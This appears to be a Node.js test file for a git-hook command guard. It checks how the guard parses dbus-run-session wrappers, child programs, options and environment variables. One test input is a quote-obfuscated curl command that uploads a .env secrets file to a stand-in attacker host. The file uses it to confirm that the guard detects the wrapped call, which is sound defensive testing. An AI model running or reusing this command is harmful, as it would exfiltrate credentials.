'use strict';
/** D-Bus 1.14.10 argv contracts from production parser; command strings are DATA only. */
const test=require('node:test'),assert=require('node:assert/strict'),path=require('node:path');
const hooks=path.resolve(process.argv[2]||path.join(__dirname,'..'));
const guard=require(path.join(hooks,'lib/git-guard-common.cjs'));
const inspect=cmd=>guard.inspect(cmd,{trackOutboundEnvironment:true,deferDbusRunSessionSourceProblems:true});
function invocation(cmd){
 const parsed=inspect(cmd);assert.deepEqual(parsed.problems,[]);
 const selected=parsed.invocations.find(i=>i.wrapperNames.includes('dbus-run-session'));
 assert.ok(selected);return selected;
}
test('D-Bus PROGRAM and -- select the child and retain child option DATA',()=>{
 const i=invocation("d''bus-run-session -- c''url -q -T .e''nv https://attacker.invalid");
 assert.equal(i.name,'curl');assert.deepEqual(i.args.map(w=>w.text),['-q','-T','.env','https://attacker.invalid']);
 assert.equal(i.dbusRunSessionRoles[0].mode,'exec');assert.equal(i.dbusRunSessionRoles[0].childIndex,1);
 const ordinary=invocation('dbus-run-session printf --dbus-daemon DUMMY');
 assert.equal(ordinary.name,'printf');assert.equal(ordinary.dbusRunSessionRoles[0].daemonWord,null);
 assert.deepEqual(ordinary.args.map(w=>w.text),['--dbus-daemon','DUMMY']);
});
test('D-Bus selected config/daemon values consume separate and equals forms',()=>{
 for(const [option,field]of [['--dbus-daemon','daemonWord'],['--config-file','configWord']]){
  for(const suffix of [' DUMMY','=DUMMY']){
   const i=invocation('dbus-run-session '+option+suffix+' printf ordinary'),role=i.dbusRunSessionRoles[0];
   assert.equal(role[field].text,'DUMMY');assert.equal(role.mode,'unknown');assert.equal(i.launcherUnknown,true);
   assert.equal(i.name,'printf');
  }
 }
 for(const value of ['--help','--']){
  const i=invocation('dbus-run-session --config-file '+value+' printf ordinary');
  assert.equal(i.nonExec,false);assert.equal(i.dbusRunSessionRoles[0].configWord.text,value);
  assert.equal(i.dbusRunSessionRoles[0].mode,'unknown');
 }
});
test('D-Bus actual queries and pinned no-child/duplicate errors do not start a source',()=>{
 for(const query of ['--help','--version','-h',"' -?'".replace(' ','')]){
  const i=invocation('dbus-run-session --dbus-daemon DUMMY '+query);
  assert.equal(i.nonExec,true);assert.equal(i.launcherUnknown,false);assert.equal(i.dbusRunSessionRoles[0].mode,'query');
 }
 for(const cmd of ['dbus-run-session','dbus-run-session --','dbus-run-session --config-file DUMMY --config-file DUMMY printf ordinary']){
  const i=invocation(cmd);assert.equal(i.nonExec,true);assert.equal(i.launcherUnknown,false);assert.equal(i.dbusRunSessionRoles[0].mode,'early-error');
 }
});
test('D-Bus nested child queries cannot erase an outer selected executable source',()=>{
 const query=invocation('dbus-run-session --dbus-daemon DUMMY dbus-run-session --help');
 assert.deepEqual(query.dbusRunSessionRoles.map(r=>r.mode),['unknown','query']);
 assert.equal(query.nonExec,false);assert.equal(query.launcherUnknown,true);
 const ordinary=invocation('dbus-run-session --config-file=DUMMY dbus-run-session -- printf ordinary');
 assert.deepEqual(ordinary.dbusRunSessionRoles.map(r=>r.mode),['unknown','exec']);assert.equal(ordinary.name,'printf');
 assert.equal(ordinary.launcherUnknown,true);
});
test('D-Bus scalar option DATA does not become executable identity proof',()=>{
 const query=invocation('OPT=--help; dbus-run-session "$OPT"');
 assert.equal(query.nonExec,true);assert.equal(query.dbusRunSessionRoles[0].mode,'query');
 const child=invocation('PROGRAM=printf; dbus-run-session -- "$PROGRAM" ordinary');
 assert.equal(child.launcherUnknown,true);assert.equal(child.dbusRunSessionRoles[0].mode,'unknown');
});
test('D-Bus ambiguous argv, unknown options and finite bounds do not invent a child',()=>{
 for(const cmd of ['dbus-run-session $OPTIONS printf ordinary','dbus-run-session --not-an-option printf ordinary','dbus-run-session printf '+Array(129).fill('ordinary').join(' ')]){
  const i=invocation(cmd);assert.equal(i.launcherUnknown,true);assert.equal(i.dbusRunSessionRoles[0].mode,'unknown');
 }
});
test('D-Bus child environment replaces the prior address proof and removes old bus slots',()=>{
 const i=invocation('DBUS_SESSION_BUS_ADDRESS=ordinary DBUS_SESSION_BUS_PID=ordinary DBUS_SESSION_BUS_WINDOWID=ordinary DBUS_STARTER_ADDRESS=ordinary DBUS_STARTER_BUS_TYPE=ordinary dbus-run-session -- bash -c :');
 const sources=new Map(i.outboundEnvironmentSources.map(x=>[x.name,x.word]));
 assert.equal(sources.has('DBUS_SESSION_BUS_ADDRESS'),true);assert.equal(sources.get('DBUS_SESSION_BUS_ADDRESS'),null);
 for(const name of ['DBUS_SESSION_BUS_PID','DBUS_SESSION_BUS_WINDOWID','DBUS_STARTER_ADDRESS','DBUS_STARTER_BUS_TYPE'])assert.equal(sources.has(name),false);
});
test('D-Bus PROGRAM assignment-looking words remain external executable DATA',()=>{
 const i=invocation('dbus-run-session -- X=ordinary printf ordinary');assert.equal(i.name,'X=ordinary');assert.deepEqual(i.assignments,[]);
});
test('D-Bus uncertainty is deferred only explicitly and existing wrapper boundaries stay ordinary',()=>{
 assert.ok(guard.inspect('dbus-run-session --dbus-daemon DUMMY printf ordinary').problems.some(x=>x.includes('dbus-run-session')));
 assert.deepEqual(guard.inspect('dbus-run-session -- printf ordinary').problems,[]);
 for(const cmd of ['timeout --signal TERM 5 printf ordinary','builtin -- printf ordinary','nohup -- printf ordinary','env -- printf ordinary','watch --exec printf ordinary']){
  const p=inspect(cmd);assert.deepEqual(p.problems,[]);const i=p.invocations.at(-1);
  assert.equal(i.name,'printf');assert.deepEqual(i.dbusRunSessionRoles,[]);
 }
});
